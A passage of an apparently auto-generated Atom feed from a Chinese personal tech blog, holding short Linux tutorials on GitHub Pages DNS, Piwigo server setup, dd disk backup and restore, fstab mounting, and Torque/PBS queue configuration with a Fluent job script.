class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@          A             192.30.252.153</span><br><span class="line">@          A             192.30.252.154</span><br><span class="line">www      CNAME           username.github.io</span><br></pre></td></tr></table></figure><p>用你自己的Github用户名替换username推荐使用DNSPOD的服务，使用国外的DNS解析服务可能有被墙的风险。</p><h2 id="3-等待你的-DNS-配置生效"><a href="#3-等待你的-DNS-配置生效" class="headerlink" title="3. 等待你的 DNS 配置生效"></a>3. 等待你的 DNS 配置生效</h2><p>对DNS的配置不是立即生效的，过10分钟再去访问你的域名看看有没有配置成功。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;github绑定自己的域名&quot;&gt;&lt;a href=&quot;#github绑定自己的域名&quot; class=&quot;headerlink&quot; title=&quot;github绑定自己的域名&quot;&gt;&lt;/a&gt;github绑定自己的域名&lt;/h1&gt;&lt;h2 id=&quot;1-向你的-Github-Pages-仓库
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭建piwigo服务器</title>
    <link href="http://dongbing.me/2019/04/12/Linux/%E6%90%AD%E5%BB%BApiwigo%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://dongbing.me/2019/04/12/Linux/搭建piwigo服务器/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.190Z</updated>
    
    <content type="html"><![CDATA[<h1 id="搭建piwigo服务器"><a href="#搭建piwigo服务器" class="headerlink" title="搭建piwigo服务器"></a>搭建piwigo服务器</h1><h2 id="1-下载安装包"><a href="#1-下载安装包" class="headerlink" title="1. 下载安装包"></a>1. 下载安装包</h2><p>从官网下载最新的安装包：<code>http://piwigo.org/basics/downloads</code></p><h2 id="2-安装php环境"><a href="#2-安装php环境" class="headerlink" title="2. 安装php环境"></a>2. 安装php环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-server</span><br><span class="line">mysql_secure_installation</span><br><span class="line">sudo apt-get install apache2</span><br><span class="line">sudo apt-get install php7.0</span><br><span class="line">sudo apt-get install phpmyadmin php-mbstring php-gettext</span><br><span class="line">sudo phpenmod mcrypt</span><br><span class="line">sudo phpenmod mbstring</span><br></pre></td></tr></table></figure><h2 id="3-配置piwigo"><a href="#3-配置piwigo" class="headerlink" title="3. 配置piwigo"></a>3. 配置piwigo</h2><p>将piwigo复制到<code>/var/www/html</code>文件夹下面，用户和组更改为：<code>www-data</code>。piwigo文件夹内<code>_data</code>的权限修改为777。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;搭建piwigo服务器&quot;&gt;&lt;a href=&quot;#搭建piwigo服务器&quot; class=&quot;headerlink&quot; title=&quot;搭建piwigo服务器&quot;&gt;&lt;/a&gt;搭建piwigo服务器&lt;/h1&gt;&lt;h2 id=&quot;1-下载安装包&quot;&gt;&lt;a href=&quot;#1-下载安装包&quot; c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>dd备份恢复系统</title>
    <link href="http://dongbing.me/2019/04/12/Linux/dd%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D%E7%B3%BB%E7%BB%9F/"/>
    <id>http://dongbing.me/2019/04/12/Linux/dd备份恢复系统/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dd备份恢复系统"><a href="#dd备份恢复系统" class="headerlink" title="dd备份恢复系统"></a>dd备份恢复系统</h1><h2 id="1-备份"><a href="#1-备份" class="headerlink" title="1. 备份"></a>1. 备份</h2><p>用liveCD开机，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/sda1 of=sda1.img.bak bs=4M</span><br></pre></td></tr></table></figure></p><h2 id="2-还原"><a href="#2-还原" class="headerlink" title="2. 还原"></a>2. 还原</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dd if=sda1.img.bak of=/dev/sda1</span><br><span class="line">e2fsck -f /dev/sda1</span><br><span class="line">resize2fs /dev/sda1</span><br><span class="line">e2fsck -f /dev/sda1</span><br></pre></td></tr></table></figure><h2 id="3-dd中的压缩"><a href="#3-dd中的压缩" class="headerlink" title="3. dd中的压缩"></a>3. dd中的压缩</h2><p>dd对磁盘是极大的浪费，100G的硬盘只用1G，dd后的备份文件也是100G，这个可以通过压缩解决。</p><h3 id="备份："><a href="#备份：" class="headerlink" title="备份："></a>备份：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/sda1 | bzip2 &gt; sda1.img.bz2</span><br></pre></td></tr></table></figure><h3 id="远程备份："><a href="#远程备份：" class="headerlink" title="远程备份："></a>远程备份：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 9527 root@45.76.218.6 &quot;dd if=/dev/vda&quot; | bzip2 | dd of=vultr.img.bz2</span><br></pre></td></tr></table></figure><h3 id="还原："><a href="#还原：" class="headerlink" title="还原："></a>还原：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzip2 -dc sda1.img.bz2 | dd of=/dev/sda1</span><br><span class="line">e2fsck -f /dev/sda1</span><br><span class="line">resize2fs /dev/sda1</span><br><span class="line">e2fsck -f /dev/sda1</span><br></pre></td></tr></table></figure><p><strong>注意如果是uefi启动，只对第二个分区e2fsck即可，第一个是EFI分区无需改动。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dd备份恢复系统&quot;&gt;&lt;a href=&quot;#dd备份恢复系统&quot; class=&quot;headerlink&quot; title=&quot;dd备份恢复系统&quot;&gt;&lt;/a&gt;dd备份恢复系统&lt;/h1&gt;&lt;h2 id=&quot;1-备份&quot;&gt;&lt;a href=&quot;#1-备份&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>编辑fstab自动挂载硬盘</title>
    <link href="http://dongbing.me/2019/04/12/Linux/%E7%BC%96%E8%BE%91fstab%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BD%E7%A1%AC%E7%9B%98/"/>
    <id>http://dongbing.me/2019/04/12/Linux/编辑fstab自动挂载硬盘/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编辑fstab自动挂载硬盘"><a href="#编辑fstab自动挂载硬盘" class="headerlink" title="编辑fstab自动挂载硬盘"></a>编辑fstab自动挂载硬盘</h1><h2 id="1-查看硬盘的UUID"><a href="#1-查看硬盘的UUID" class="headerlink" title="1. 查看硬盘的UUID"></a>1. 查看硬盘的UUID</h2><p>如果不使用UUID挂载，硬盘交换SATA口后可能会无法启动系统。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo blkid -o list</span><br></pre></td></tr></table></figure></p><h2 id="2-编辑fstab"><a href="#2-编辑fstab" class="headerlink" title="2. 编辑fstab"></a>2. 编辑fstab</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/fstab</span><br></pre></td></tr></table></figure><p>一个简单的<code>/etc/fstab</code>，使用内核名称标识磁盘如下所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># &lt;file system&gt;        &lt;dir&gt;         &lt;type&gt;    &lt;options&gt;             &lt;dump&gt; &lt;pass&gt;</span><br><span class="line">tmpfs                  /tmp          tmpfs     nodev,nosuid          0      0</span><br><span class="line">/dev/sda1              /             ext4      defaults,noatime      0      1</span><br><span class="line">/dev/sda2              none          swap      defaults              0      0</span><br><span class="line">/dev/sda3              /home         ext4      defaults,noatime      0      2</span><br></pre></td></tr></table></figure></p><p>其中一行应该包含如下字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;file system&gt;&lt;dir&gt;&lt;type&gt;&lt;options&gt;&lt;dump&gt;&lt;pass&gt;</span><br></pre></td></tr></table></figure></p><p><code>&lt;dump&gt;</code>dump工具通过它决定何时作备份。dump会检查其内容，并用数字来决定是否对这个文件系统进行备份。允许的数字是0和1。0表示忽略，1则进行备份。大部分的用户是没有安装dump的，对他们而言<code>&lt;dump&gt;</code>应设为0。</p><p><code>&lt;pass&gt;</code>fsck读取<code>&lt;pass&gt;</code>的数值来决定需要检查的文件系统的检查顺序。允许的数字是0,1和2。根目录应当获得最高的优先权1,其它所有需要被检查的设备设置为2。0表示设备不会被fsck所检查。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;编辑fstab自动挂载硬盘&quot;&gt;&lt;a href=&quot;#编辑fstab自动挂载硬盘&quot; class=&quot;headerlink&quot; title=&quot;编辑fstab自动挂载硬盘&quot;&gt;&lt;/a&gt;编辑fstab自动挂载硬盘&lt;/h1&gt;&lt;h2 id=&quot;1-查看硬盘的UUID&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置Torque</title>
    <link href="http://dongbing.me/2019/04/12/Linux/%E9%85%8D%E7%BD%AETorque/"/>
    <id>http://dongbing.me/2019/04/12/Linux/配置Torque/</id>
    <published>2019-04-11T16:00:00.000Z</published>
    <updated>2019-04-12T15:39:45.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="配置Torque"><a href="#配置Torque" class="headerlink" title="配置Torque"></a>配置Torque</h1><h2 id="1-下载Torque源码"><a href="#1-下载Torque源码" class="headerlink" title="1. 下载Torque源码"></a>1. 下载Torque源码</h2><p>去Torque<a href="http://www.adaptivecomputing.com/support/download-center/torque-download/" target="_blank" rel="noopener">官网</a>下载最新版本的源码。</p><h2 id="2-编译与安装"><a href="#2-编译与安装" class="headerlink" title="2. 编译与安装"></a>2. 编译与安装</h2><p><strong><em>configure -&gt; make -&gt; make install</em></strong><br>Torque默认安装在/var/spool/torque文件夹下面。</p><p>Ubuntu可以直接使用apt安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install torque-server</span><br></pre></td></tr></table></figure><h2 id="3-配置Torque"><a href="#3-配置Torque" class="headerlink" title="3. 配置Torque"></a>3. 配置Torque</h2><h3 id="3-1-配置节点名称"><a href="#3-1-配置节点名称" class="headerlink" title="3.1. 配置节点名称"></a>3.1. 配置节点名称</h3><p>在/etc/hosts中加入管理节点和计算节点的IP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure><p>增加一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 torqueserver calnode</span><br></pre></td></tr></table></figure><h3 id="3-2-配置pbs-server"><a href="#3-2-配置pbs-server" class="headerlink" title="3.2. 配置pbs_server"></a>3.2. 配置pbs_server</h3><p>初始化pbs_server：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pbs_server -t create</span><br></pre></td></tr></table></figure><p>在Ubuntu中可以执行如下命令建立默认服务器和队列，并把自己列为管理员：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bash /usr/share/doc/torque-common/torque.setup $USER torqueserver</span><br></pre></td></tr></table></figure><p>修改/var/spool/torque/server_name内容为：<code>torqueserver</code><br>修改/var/spool/torque/server_priv/nodes内容为：<code>calnode np=4</code><br>创建/var/spool/torque/mom_priv/config文件，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pbsserver torqueserver</span><br><span class="line">$mom_host calnode</span><br></pre></td></tr></table></figure><p>启动trqauthd服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start trqauthd.service</span><br></pre></td></tr></table></figure><p>重启pbs_mom，pbs_sched，pbs_server。</p><h3 id="3-3-设置pbs-server并创建默认队列"><a href="#3-3-设置pbs-server并创建默认队列" class="headerlink" title="3.3. 设置pbs_server并创建默认队列"></a>3.3. 设置pbs_server并创建默认队列</h3><p>执行<code>qmgr</code>进入管理界面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">set server scheduling=True</span><br><span class="line">set server default_queue=batch</span><br><span class="line">set server scheduler_iteration=600</span><br><span class="line">set server node_check_rate=150</span><br><span class="line">set server tcp_timeout=6</span><br><span class="line">set server mom_job_sync=True</span><br><span class="line">set server keep_completed=1</span><br><span class="line">set server allow_node_submit=True</span><br><span class="line"></span><br><span class="line">create queue batch</span><br><span class="line">set queue batch queue_type=Execution</span><br><span class="line">set queue batch resources_default.nodes=4</span><br><span class="line">set queue batch resources_default.walltime=480:00:00</span><br><span class="line">set queue batch enabled=True</span><br><span class="line">set queue batch started=True</span><br></pre></td></tr></table></figure><p>附Sugon服务器batch队列配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">set queue batch queue_type=Execution</span><br><span class="line">set queue batch Priority=1</span><br><span class="line">set queue batch set queue batch max_user_queuable=3</span><br><span class="line">set queue batch resources_max.cput=1920:00:00</span><br><span class="line">set queue batch resources_max.nodes=1:ppn=080</span><br><span class="line">set queue batch resources_max.walltime=240:00:00</span><br><span class="line">set queue batch resources_min.nodes=1:ppn=021</span><br><span class="line">set queue batch resources_default.nodes=1:ppn=8</span><br><span class="line">set queue batch resources_default.walltime=240:00:00</span><br><span class="line">set queue batch resources_assigned.nodect=1</span><br><span class="line">set queue batch max_user_run=2</span><br><span class="line">set queue batch enabled=True</span><br><span class="line">set queue batch started=True</span><br></pre></td></tr></table></figure><p>#4. 一个典型的Fluent PBS脚本<br>一个典型的Fluent PBS脚本如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#PBS -N DONGBING_FLUENT</span><br><span class="line">#PBS -q tiny</span><br><span class="line">#PBS -l nodes=1:ppn=16</span><br><span class="line">#PBS -j oe</span><br><span class="line"></span><br><span class="line">cd $PBS_O_WORKDIR</span><br><span class="line">NP=`wc -l &lt; $PBS_NODEFILE`</span><br><span class="line"></span><br><span class="line">/public/software/ansys_inc_172/v172/fluent/bin/fluent 3ddp -ssh -g -pdefault -t$NP -cnf=$PBS_NODEFILE  -i  script.jou &gt; log.txt</span><br></pre></td></tr></table></figure><p>其中script.jou是Fluent的TUI命令，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">rc channel_mixture_heat_species.cas</span><br><span class="line">rd channel_mixture_heat_species.dat</span><br><span class="line"></span><br><span class="line">!pwd</span><br><span class="line"></span><br><span class="line">file/auto-save/root-name ./results/channel_hole_transient</span><br><span class="line">file/auto-save/append-file-name-with/flow-time 8</span><br><span class="line"></span><br><span class="line">file/auto-save/data-frequency 1</span><br><span class="line">solve/set/time-step 0.000001</span><br><span class="line">solve/set/max-iterations-per-time-step 200</span><br><span class="line">solve/dual-time-iterate 100 200</span><br><span class="line"></span><br><span class="line">file/auto-save/data-frequency 10</span><br><span class="line">solve/set/time-step 0.00001</span><br><span class="line">solve/set/max-iterations-per-time-step 200</span><br><span class="line">solve/dual-time-iterate 1000 200</span><br><span class="line"></span><br><span class="line">file/auto-save/data-frequency 10</span><br><span class="line">solve/set/time-step 0.0001</span><br><span class="line">solve/set/max-iterations-per-time-step 200</span><br><span class="line">solve/dual-time-iterate 1000 200</span><br><span class="line"></span><br><span class="line">!sh `ls | grep cleanup`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;配置Torque&quot;&gt;&lt;a href=&quot;#配置Torque&quot; class=&quot;headerlink&quot; title=&quot;配置Torque&quot;&gt;&lt;/a&gt;配置Torque&lt;/h1&gt;&lt;h2 id=&quot;1-下载Torque源码&quot;&gt;&lt;a href=&quot;#1-下载Torque源码&quot; cla
      
    
    </summary>
    
    
  </entry>
  
</feed>
